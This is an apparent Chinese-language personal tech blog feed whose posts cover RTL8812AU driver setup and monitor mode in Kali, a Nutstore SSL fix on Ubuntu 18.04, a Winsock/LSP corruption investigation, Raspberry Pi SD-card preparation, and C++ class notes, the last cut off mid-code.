        <content type="html"><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>到手一块AWUS036ACH网卡，不用说是干什么的了，就是驱动问题比较难解决。目前解决了在Ubuntu下正常使用，在Kali虚拟机里可以开启monitor模式。<br>我查了一下，内置芯片是rtl8812AU,所以Ubuntu的驱动问题解决如下。</p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><ul><li>先git下来<br><code>git clone https://github.com/diederikdehaas/rtl8812AU.git</code></li><li>安装DKMS<br>DKMS是一个自动编译和安装内核模块的工具<br><code>sudo apt-get install dkms</code></li><li>安装驱动<br>进入git的目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DRV_NAME=rtl8812AU</span><br><span class="line">DRV_VERSION=4.3.20</span><br><span class="line">sudo mkdir /usr/src/$&#123;DRV_NAME&#125;-$&#123;DRV_VERSION&#125;</span><br><span class="line">sudo cp -Rf ~/Downloads/rtl8812AU-driver-4.3.20/* /usr/src/rtl8812AU-4.3.20/</span><br><span class="line">sudo dkms add -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;</span><br><span class="line">sudo dkms build -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;</span><br><span class="line">sudo dkms install -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;</span><br><span class="line">sudo modprobe 8812au</span><br></pre></td></tr></table></figure></li></ul><p>这样就能识别网卡了,但是开启monitor模式没有成功,需要有时间折腾.</p><ul><li>卸载驱动<br><code>dkms remove ${DRV_NAME}/${DRV_VERSION} --all</code></li></ul><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h3><p>Kali的问题是缺少内核头文件.<br><code>apt-get install linux-headers-$(uname -r)</code></p><p>我这里是没有成功的,就必须查找可用的头进行安装<br><code>apt-cache search linux-image</code><br><code>apt-cache search linux-headers</code></p><p>我这里根据提示安装了<br><code>apt-get install linux-image-4.16.0-kali2-amd64</code><br><code>apt-get install linux-headers-4.16.0-kali2-amd64</code><br><code>reboot</code></p><ul><li><p>安装驱动<br><code>apt install realtek-rtl88xxau-dkms</code><br><code>reboot</code><br><code>iwconfig</code>就可以看到设备情况了.</p></li><li><p>使用问题</p></li></ul><p>我试着使用<code>airmon-ng start</code>直接开始的时候出现了报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">Found 4 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to run &apos;airmon-ng check kill&apos;</span><br><span class="line"></span><br><span class="line">PID Name</span><br><span class="line">535 NetworkManager</span><br><span class="line">661 dhclient</span><br><span class="line">5256 wpa_supplicant</span><br><span class="line">5281 dhclient</span><br><span class="line"></span><br><span class="line">PHYInterfaceDriverChipset</span><br><span class="line"></span><br><span class="line">phy0wlan08812auRealtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac WLAN Adapter</span><br><span class="line">cat: /sys/class/ieee80211/phy0/device/net/wlan0mon/type: No such file or directory</span><br><span class="line"></span><br><span class="line">Newly created monitor mode interface wlan0mon is *NOT* in monitor mode.</span><br><span class="line">Removing non-monitor wlan0mon interface...</span><br><span class="line"></span><br><span class="line">WARNING: unable to start monitor mode, please run &quot;airmon-ng check kill&quot;</span><br></pre></td></tr></table></figure><ul><li>解决方案</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ip link set wlan0 down</span><br><span class="line">root@kali:~# iwconfig wlan0 mode monitor</span><br><span class="line">root@kali:~# ip link set wlan0 up</span><br><span class="line">root@kali:~# airmon-ng</span><br></pre></td></tr></table></figure><p>这样抓包就没有问题了，但是还是有很多问题暂时没解决。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>解决Ubuntu18.04坚果云问题</title>
      <link href="/2018/06/05/%E8%A7%A3%E5%86%B3Ubuntu18-04%E5%9D%9A%E6%9E%9C%E4%BA%91%E9%97%AE%E9%A2%98/"/>
      <url>/2018/06/05/%E8%A7%A3%E5%86%B3Ubuntu18-04%E5%9D%9A%E6%9E%9C%E4%BA%91%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="问题起因"><a href="#问题起因" class="headerlink" title="问题起因"></a>问题起因</h3><p>新装了Ubuntu 18.04,装好坚果云之后.登录提示SSL链接失败,本来都想换回16.04,后来找到了解决方案.</p><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><p>在安装坚果云时,会自动安装OpenJDK.问题可能出现在JDK上面.所以先卸载OpenJDK.<br><code>sudo apt-get remove openjdk*</code><br>下载ORACLE JDK<br><code>http://www.oracle.com/technetwork/java/javase/downloads/jdk10-downloads-4416644.html</code><br>解压<br><code>tar zxvf jdk-10.interim.update.patch_linux-x64_bin.tar.gz</code></p><p>编辑.bashrc文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#JAVA</span><br><span class="line">JAVA_HOME=/home/zz/Documents/jdk-10.0.1</span><br><span class="line">JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">JAVA_BIN=$JAVA_HOME/bin</span><br><span class="line">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME PATH CLASSPATH</span><br></pre></td></tr></table></figure></p><p><code>source ~/.bashrc</code></p><p>做到这一步发现问题还是没有解决,看到网上的官方临时解决方案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">备份并移除老的cacerts</span><br><span class="line">sudo mv /etc/ssl/certs/java/cacerts&#123;,.backup&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">生成新的cacerts</span><br><span class="line">sudo keytool -importkeystore -destkeystore /etc/ssl/certs/java/cacerts -deststoretype jks -deststorepass changeit -srckeystore /etc/ssl/certs/java/cacerts.backup -srcstoretype pkcs12 -srcstorepass changeit</span><br></pre></td></tr></table></figure><p>这步成功之后可以成功登录了,但是无法显示图标.安装TopIcons Plus.</p><p><code>https://github.com/phocean/TopIcons-plus</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install make</span><br><span class="line">git clone https://github.com/phocean/TopIcons-plus.git</span><br><span class="line">cd TopIcons-plus</span><br><span class="line">make install</span><br><span class="line">sudo make install INSTALL_PATH=/usr/share/gnome-shell/extensions</span><br></pre></td></tr></table></figure><p>reload GNOME Shell</p><p>在gnome-tweak-tool里面打开插件即可</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>一次关于VPN报错的摸鱼</title>
      <link href="/2018/06/02/%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8EVPN%E6%8A%A5%E9%94%99%E7%9A%84%E6%91%B8%E9%B1%BC/"/>
      <url>/2018/06/02/%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8EVPN%E6%8A%A5%E9%94%99%E7%9A%84%E6%91%B8%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>现在这个博客懒得申请图床，其他方式插入图片也太麻烦，所以纯文字记录啦。<br>事情的起因是发现了一次VPN报错，VPN报错提示很简单。The VPN Service is not acailable. 通过这个报错去寻找VPN服务是否开启，如果这么简单就解决了，就没有后面的事了。<br>问题的解决方案最后也很简单，一条<code>netsh winsock reset</code>就解决了。但是探究问题产生的原因是这次摸鱼的开始。<br>并且发现这个问题与之前碰到的在开机以后提示<code>你的电脑将在一分钟后自动重启</code>本质上原因是一样的。</p><h3 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h3><p>通过<code>netsh winsock reset</code>命令解决表明windows的winsock出现错误。那么猜测是LSP出现的问题。并且通过Autoruns软件发现了TGP创建了LSP的相关注册表项。</p><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p><code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns</code><br>官方的简单介绍<br>This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, shows you what programs are configured to run during system bootup or login, and when you start various built-in Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond other autostart utilities.</p><h3 id="LSP"><a href="#LSP" class="headerlink" title="LSP"></a>LSP</h3><p>维基相关介绍<br><code>https://en.wikipedia.org/wiki/Layered_Service_Provider</code><br>Layered Service Provider (LSP) is a deprecated feature of the Microsoft Windows Winsock 2 Service Provider Interface (SPI). A Layered Service Provider is a DLL that uses Winsock APIs to attempt to insert itself into the TCP/IP protocol stack. Once in the stack, a Layered Service Provider can intercept and modify inbound and outbound Internet traffic. It allows processing of all the TCP/IP traffic taking place between the Internet and the applications that are accessing the Internet (such as a web browser, the email client, etc.).<br>其中的缺点很关键。<br>划一下重点<br>Another major common issue with LSPs was that if they were to be removed or unregistered improperly or if the LSP was buggy, it would result in corruption of the Winsock catalog in the registry, and the entire TCP/IP stack would break and the computer could no longer access the network.</p><h3 id="TGP"><a href="#TGP" class="headerlink" title="TGP"></a>TGP</h3><p>通过Autotuns软件中的Winsock Providers选项中，可以看到<code>HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entires</code>和<code>HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64</code>注册表中有TGP写入的ierd_tgp_lsp开头的相关信息。指向<code>c:\windows\syswow64\ierd_tgp_lsp.dll</code> 以及<code>ierd_tgp_lsp64.dll</code><br>由LSP的功能推测，这个dll会在与网络加速相关功能的时候启用。<br>那么接下来就开始复现错误，接下来的操作在一台全新的Win10 1804虚拟机下进行。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>刚安装好wegame的时候，autotuns中看到是没有LSP注册表修改的，在使用一次网络加速功能后，注册表就增加了相关注册表项。那么如何判断<code>ierd_tgp_lsp.dll</code>是否被使用呢？我首先用了Process Explorer工具进行dll的搜索。没有开启游戏前没有进程与之相关，在开启后发现有三四个进程（其中一些是系统进程）与之相关。推测与网络相关进程都被注入，注入细节目前搞不清楚，尝试过逆向dll，水平有限没搞懂。<br>dll问题先暂时放在一边，问题的原因是Winsock被破坏，那么如何观察winsock的情况是一个问题。这个问题的解决也比较简单，参见<code>https://support.microsoft.com/zh-cn/help/811259/how-to-determine-and-to-recover-from-winsock2-corruption-in-windows-se</code><br>介绍的方法是使用Msinfo32程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">单击“开始”，单击“运行”，键入“Msinfo32”，然后单击“确定”。</span><br><span class="line">依次展开“组件”和“网络”，然后单击“协议”。</span><br><span class="line">“协议”下将显示 10 个节。如果 Winsock2 项未损坏，则节标题中将包括下列名称：</span><br><span class="line">MSAFD Tcpip [TCP/IP]</span><br><span class="line">MSAFD Tcpip [UDP/IP]</span><br><span class="line">MSAFD Tcpip [TCP/IPv6]</span><br><span class="line">MSAFD Tcpip [UDP/IPv6] </span><br><span class="line">RSVP UDP Service Provider</span><br><span class="line">RSVP TCP Service Provider</span><br><span class="line">RSVP UDPv6 Service Provider </span><br><span class="line">RSVP TCPv6 Service Provider </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">MSAFD NetBIOS [\Device\NetBT_Tcpip... </span><br><span class="line">如果显示的名称与此列表中的名称有任何不同，则说明 Winsock2 项已损坏，或安装了第三方加载项（如代理软件）。</span><br><span class="line">如果安装了第三方加载项，则该加载项的名称将替代列表中的字母“MSAFD”。 </span><br><span class="line">如果列表中的节数多于 10 个，则说明安装了第三方加载项。 </span><br><span class="line">如果少于 10 个，则说明缺少信息。</span><br></pre></td></tr></table></figure></p><p>在没有开启加速器之前，我的系统上第一项显示<code>AF_UNIX</code>,之后显示<code>MSAFD Tcpip [TCP/IP]</code>,<code>MSAFD Tcpip [UDP/IP]</code>等等.<br>在开启加速后，第一项显示<code>ierd_tgp_lsp64 over [MSAFD Tcpip [TCP/IP]]</code>,第二项显示<code>ierd_tgp_lsp64 over [MSAFD Tcpip [UDP/IP]]</code>.</p><p>很明显修改了相关信息，在正常退出TGP时，信息会恢复原状，但是DLL仍然与进程相关，在重启后无关。那么是否非正常退出TGP时会发生问题，答案是肯定的，信息并没有被修改回原来的情况。但是重启后并没有碰到VPN的问题，重启后发现联网的程序都挂上了lspdll,正常情况下重启是没有的。32位的程序挂32位的dll,64位的程序挂64位的，程序的网络通信正常，系统也正常运作。但是Winsock中的信息并没有被修改回来。（我推测是TX的程序员做的容错机制，即使异常也不会发生明显的错误，在下次正常运行程序时可以被修改回来，但是这种容错机制似乎是有点权限过大，还没有仔细研究）</p><p>现在的问题就是如何复现VPN的问题，根据这个思路下去，既然联网的程序都要调用tgp给的lspdll.那么就把DLL文件删除，当然不是那么容易删的。因为它一直是被使用的状态，我就通过进入PE系统将两个DLL文件改名。再进入系统时，运行VPN就出现了最开始出现的错误。这时运行<code>netsh winsock reset</code>解决问题也就很顺理成章了。</p><h3 id="ARK"><a href="#ARK" class="headerlink" title="ARK"></a>ARK</h3><p>我还是想要细致探究一下，所以想借助ARK类工具(AntiRootkit)。但是发现64位系统运行ARK工具并不是很方便，于是又开了一台Win7 32位的虚拟机继续研究。</p><p>基本进行相同的操作，发现在异常操作后，lspdll其实是在winsock供应者启动项中（一直在启动项中）。这下之前的情况就说得通了。然后我用Antispy将相关启动项关闭，发现系统启动都出现了问题，黑屏无法进入系统。那么可以推测问题产生的一种原因是异常关闭TGP之后，电脑中的相关安全或优化程序将启动项优化。</p><p>其实本来想尝试一下内存监控的，有一点复杂。其实到最后对问题产生的原因也是猜测和推测，只有到具体出错的情况时再进行分析是最准确的，今天只做了个简单的复现和分析。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Linux树莓派NOOBS安装</title>
      <link href="/2018/05/31/NOOBS/"/>
      <url>/2018/05/31/NOOBS/</url>
      
        <content type="html"><![CDATA[<p>记一个笔记,在Linux环境下把树莓派的NOOBS折腾进去.</p><p>首先初始化SD卡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Disk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xf9362f7a</span><br><span class="line"></span><br><span class="line">Device     Boot Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sdb1        8192    93236    85045 41.5M  c W95 FAT32 (LBA)</span><br><span class="line">/dev/sdb2       94208 31116287 31022080 14.8G 83 Linux</span><br></pre></td></tr></table></figure><p>出现这个,这个是我的Pi使用过sd卡,所以会有两个分区.现在要将两个分区擦除.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk /dev/sdb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Welcome to fdisk (util-linux 2.31.1).</span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command (m for help): d</span><br><span class="line">Partition number (1,2, default 2): 1</span><br><span class="line"></span><br><span class="line">Partition 1 has been deleted.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xf9362f7a</span><br><span class="line"></span><br><span class="line">Device     Boot Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sdb2       94208 31116287 31022080 14.8G 83 Linux</span><br><span class="line"></span><br><span class="line">Command (m for help): d</span><br><span class="line">Selected partition 2</span><br><span class="line">Partition 2 has been deleted.</span><br></pre></td></tr></table></figure><p>这样就把两个分区都删除了.</p><p>现在创建一个新的分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): n</span><br><span class="line">Partition type</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended (container for logical partitions)</span><br><span class="line">Select (default p):</span><br><span class="line"></span><br><span class="line">Using default response p.</span><br><span class="line">Partition number (1-4, default 1):</span><br><span class="line">First sector (2048-31116287, default 2048):</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-31116287, default 31116287):</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of type &apos;Linux&apos; and of size 14.9 GiB.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xf9362f7a</span><br></pre></td></tr></table></figure></p><p>分区类型不是Linux FAT32.t命令改变,选择b.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): t</span><br><span class="line">Selected partition 1</span><br><span class="line">Hex code (type L to list all codes): l</span><br><span class="line"></span><br><span class="line"> 0  Empty           24  NEC DOS         81  Minix / old Lin bf  Solaris</span><br><span class="line"> 1  FAT12           27  Hidden NTFS Win 82  Linux swap / So c1  DRDOS/sec (FAT-</span><br><span class="line"> 2  XENIX root      39  Plan 9          83  Linux           c4  DRDOS/sec (FAT-</span><br><span class="line"> 3  XENIX usr       3c  PartitionMagic  84  OS/2 hidden or  c6  DRDOS/sec (FAT-</span><br><span class="line"> 4  FAT16 &lt;32M      40  Venix 80286     85  Linux extended  c7  Syrinx</span><br><span class="line"> 5  Extended        41  PPC PReP Boot   86  NTFS volume set da  Non-FS data</span><br><span class="line"> 6  FAT16           42  SFS             87  NTFS volume set db  CP/M / CTOS / .</span><br><span class="line"> 7  HPFS/NTFS/exFAT 4d  QNX4.x          88  Linux plaintext de  Dell Utility</span><br><span class="line"> 8  AIX             4e  QNX4.x 2nd part 8e  Linux LVM       df  BootIt</span><br><span class="line"> 9  AIX bootable    4f  QNX4.x 3rd part 93  Amoeba          e1  DOS access</span><br><span class="line"> a  OS/2 Boot Manag 50  OnTrack DM      94  Amoeba BBT      e3  DOS R/O</span><br><span class="line"> b  W95 FAT32       51  OnTrack DM6 Aux 9f  BSD/OS          e4  SpeedStor</span><br><span class="line"> c  W95 FAT32 (LBA) 52  CP/M            a0  IBM Thinkpad hi ea  Rufus alignment</span><br><span class="line"> e  W95 FAT16 (LBA) 53  OnTrack DM6 Aux a5  FreeBSD         eb  BeOS fs</span><br><span class="line"> f  W95 Ext&apos;d (LBA) 54  OnTrackDM6      a6  OpenBSD         ee  GPT</span><br><span class="line">10  OPUS            55  EZ-Drive        a7  NeXTSTEP        ef  EFI (FAT-12/16/</span><br><span class="line">11  Hidden FAT12    56  Golden Bow      a8  Darwin UFS      f0  Linux/PA-RISC b</span><br><span class="line">12  Compaq diagnost 5c  Priam Edisk     a9  NetBSD          f1  SpeedStor</span><br><span class="line">14  Hidden FAT16 &lt;3 61  SpeedStor       ab  Darwin boot     f4  SpeedStor</span><br><span class="line">16  Hidden FAT16    63  GNU HURD or Sys af  HFS / HFS+      f2  DOS secondary</span><br><span class="line">17  Hidden HPFS/NTF 64  Novell Netware  b7  BSDI fs         fb  VMware VMFS</span><br><span class="line">18  AST SmartSleep  65  Novell Netware  b8  BSDI swap       fc  VMware VMKCORE</span><br><span class="line">1b  Hidden W95 FAT3 70  DiskSecure Mult bb  Boot Wizard hid fd  Linux raid auto</span><br><span class="line">1c  Hidden W95 FAT3 75  PC/IX           bc  Acronis FAT32 L fe  LANstep</span><br><span class="line">1e  Hidden W95 FAT1 80  Old Minix       be  Solaris boot    ff  BBT</span><br><span class="line">Hex code (type L to list all codes): b</span><br><span class="line">Changed type of partition &apos;Linux&apos; to &apos;W95 FAT32&apos;.</span><br></pre></td></tr></table></figure><p>最后w命令将新分区写入SD卡.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xf9362f7a</span><br><span class="line"></span><br><span class="line">Device     Boot Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sdb1        2048 31116287 31114240 14.9G  b W95 FAT32</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered.</span><br></pre></td></tr></table></figure><p>做到这步还没有格式化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs.vfat /dev/sdb1</span><br></pre></td></tr></table></figure><p>格式化完成后,把SD卡重新插拔一下.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mount | grep -i sdb1</span><br><span class="line">/dev/sdb1 on /media/zz/E8E3-71A1 type vfat (rw,nosuid,nodev,relatime,uid=1000,gid=1000,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,showexec,utf8,flush,errors=remount-ro,uhelper=udisks2)</span><br><span class="line">cd /media/zz/E8E3-71A1/</span><br><span class="line">unzip /home/zz/NOOBS_v2_8_1.zip</span><br></pre></td></tr></table></figure><p>然后找到它的位置,通过unzip命令直接解压到SD卡.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">sudo umount /dev/sdb1</span><br></pre></td></tr></table></figure></p><p>最后卸载.</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>C++类和对象笔记</title>
      <link href="/2018/05/30/C-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/05/30/C-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="内联成员函数"><a href="#内联成员函数" class="headerlink" title="内联成员函数"></a>内联成员函数</h2><ul><li>内联成员函数<ul><li>inline + 成员函数</li><li>整个函数体出现在类定义内部<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> B::func1()&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="成员函数的重载及参数缺省"><a href="#成员函数的重载及参数缺省" class="headerlink" title="成员函数的重载及参数缺省"></a>成员函数的重载及参数缺省</h2><ul><li>重载成员函数</li><li><p>成员函数——带缺省参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span 